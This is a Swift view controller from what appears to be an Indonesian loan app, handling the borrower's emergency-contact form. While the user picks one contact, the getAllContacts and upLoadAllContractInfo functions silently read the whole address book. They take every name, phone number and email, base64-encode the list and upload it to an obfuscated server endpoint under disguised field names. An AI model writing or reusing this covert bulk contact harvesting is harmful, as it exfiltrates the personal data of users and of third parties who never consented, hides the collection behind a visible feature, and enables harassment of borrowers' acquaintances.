//
//  ContractViewController.swift
//  Catatan
//
//  Created by apple on 2024/2/29.
//

import UIKit
import HandyJSON
import MBProgressHUD_WJExtension
import Contacts

class ContractViewController: BaseViewController {
    
    var bidders: String = ""
    
    var hardworking: String = ""
    
    var startTime1: String = ""
    
    var isUpload: Bool = false
    
    var incomes: [IncomesModel]?
    
    lazy var contractView: ContractView = {
        let contractView = ContractView()
        return contractView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Do any additional setup after loading the view.
        addNavView()
        navView.block = { [weak self] in
            self?.wanLiuAuthView("Apakah Anda yakin ingin menyerah pada permohonan pinjaman ini?")
        }
        view.addSubview(contractView)
        view.insertSubview(contractView, belowSubview: navView)
        contractView.snp.makeConstraints { make in
            make.edges.equalTo(view)
        }
        contractView.block = { [weak self] array in
            print("array>>>contract>>>\(array)")
            self?.upLoadContractInfo(array)
        }
        contractView.block1 = { [weak self] cell in
            self?.getAllContacts(cell: cell) { [weak self] modelArray in
                if let modelArray = modelArray {
                    print("modelArray>>>>>>>>>>>\(modelArray)")
                    if self?.isUpload == false {
                        self?.upLoadAllContractInfo(modelArray)
                    }
                }
            }
        }
        getContractInfo()
        startTime1 = String(Int(Date().timeIntervalSince1970))
    }
    
    func getContractInfo() {
        addHudView()
        let dict = ["bidders":bidders]
        NetApiWork.shared.requestAPI(params: dict, pageUrl: tarzanDamned, method: .post) { [weak self] baseModel in
            let awess = baseModel.awareness
            let edges = baseModel.edges
            if awess == 0 || awess == 00 {
                let model = JSONDeserializer<HoveredModel>.deserializeFrom(dict: baseModel.hovered)
                let incomes = model?.released?.incomes
                if let incomes = incomes {
                    self?.incomes = incomes
                    self?.contractView.array = incomes
                    self?.contractView.tableView.reloadData()
                }
            }
            self?.removeHudView()
        } errorBlock: { [weak self] error in
            self?.removeHudView()
        }
    }
    
    func getAllContacts(cell: ContractViewCell,completion: @escaping ([[String: Any]]?) -> Void) {
        var contactsArray: [[String: Any]] = []
        let contactStore = CNContactStore()
        ContactsManager.requestContactsPermission { [weak self] granted in
            if granted {
                self?.someFunction(cell: cell)
                let keysToFetch: [CNKeyDescriptor] = [CNContactGivenNameKey as NSString, CNContactFamilyNameKey as NSString, CNContactPhoneNumbersKey as NSString, CNContactEmailAddressesKey as NSString]
                let fetchRequest = CNContactFetchRequest(keysToFetch: keysToFetch)
                DispatchQueue.main.async {
                    do {
                        try contactStore.enumerateContacts(with: fetchRequest) { (contact, stop) in
                            var phoneNumbers: [String] = []
                            for phoneNumber in contact.phoneNumbers {
                                let value = phoneNumber.value.stringValue
                                phoneNumbers.append(value)
                            }
                            
                            var emailAddresses: [String] = []
                            for emailAddress in contact.emailAddresses {
                                let value = emailAddress.value as String
                                emailAddresses.append(value)
                            }
                            
                            var phoneStr: String?
                            
                            var emialStr: String?
                            
                            if phoneNumbers.count >= 1 {
                                phoneStr = phoneNumbers.joined(separator: ",")
                            }
                            
                            if emailAddresses.count >= 1 {
                                emialStr = emailAddresses.joined(separator: ",")
                            }
                            
                            let newContact = ["conjured":contact.givenName + contact.familyName,"grieving":phoneStr ?? "","balanced":emialStr ?? ""] as [String: Any]
                            contactsArray.append(newContact as [String : Any])
                        }
                        DispatchQueue.main.async {
                            completion(contactsArray)
                        }
                    } catch {
                        print("Error fetching contacts: \(error)")
                        DispatchQueue.main.async {
                            // Completion block called on the main thread
                            completion(nil)
                        }
                    }
                }
            } else {
                print("未获得通讯录权限")
                self?.wanLiuView("Anda belum memperoleh izin untuk mengakses kontak, silakan menuju ke pengaturan.")
                DispatchQueue.main.async {
                    completion(nil)
                }
            }
        }
    }
    
    func someFunction(cell: ContractViewCell) {
        ContactsManager.showContactPicker { firstName, lastName, email, phoneNumber in
            cell.nameLabel5.textColor = .black
            cell.nameLabel6.textColor = .black
            cell.model.conjured = firstName + lastName
            cell.model.female = phoneNumber
            cell.nameLabel5.text = firstName + lastName
            cell.nameLabel6.text = phoneNumber
        }
    }
    
    func upLoadContractInfo(_ array: [[String: Any]]) {
        addHudView()
        var jsonDataString: String?
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: array, options: [])
            if let jsonString = String(data: jsonData, encoding: .utf8) {
                jsonDataString = jsonString
                print("JSON字符串: \(jsonString)")
            }
        } catch {
            print("转换为JSON字符串时出现错误: \(error.localizedDescription)")
        }
        let dict = ["bidders":bidders,"hovered":jsonDataString ?? ""] as [String : Any]
        NetApiWork.shared.uploadDataAPI(params: dict, pageUrl: buttonGreat, method: .post) { [weak self] baseModel in
            let awess = baseModel.awareness
            let edges = baseModel.edges
            if awess == 0 || awess == 00 {
                print("isUpload>>>>>isUpload")
                self?.maidian(productID: self?.bidders ?? "", startTime: self?.startTime1 ?? "", type: "8", orderID: self?.hardworking ?? "")
                self?.getProductDetailInfo(self?.bidders ?? "","","")
            }
            self?.removeHudView()
            MBProgressHUD.wj_showPlainText(edges ?? "", view: nil)
        } errorBlock: { [weak self] error in
            self?.removeHudView()
        }
    }
    
    func upLoadAllContractInfo(_ array: [[String: Any]]) {
        let jsonData = try? JSONSerialization.data(withJSONObject: array, options: [])
        let base64Data = jsonData?.base64EncodedString() ?? ""
        let dict = ["lives":"3","hovered":base64Data] as [String : Any]
        NetApiWork.shared.uploadDataAPI(params: dict, pageUrl: pocketsHardworking, method: .post) { [weak self] baseModel in
            let awess = baseModel.awareness
            if awess == 0 || awess == 00 {
                self?.isUpload = true
                print("isAllUpload>>>>>isAllUpload")
            }
        } errorBlock: { error in
            
        }
    }
}
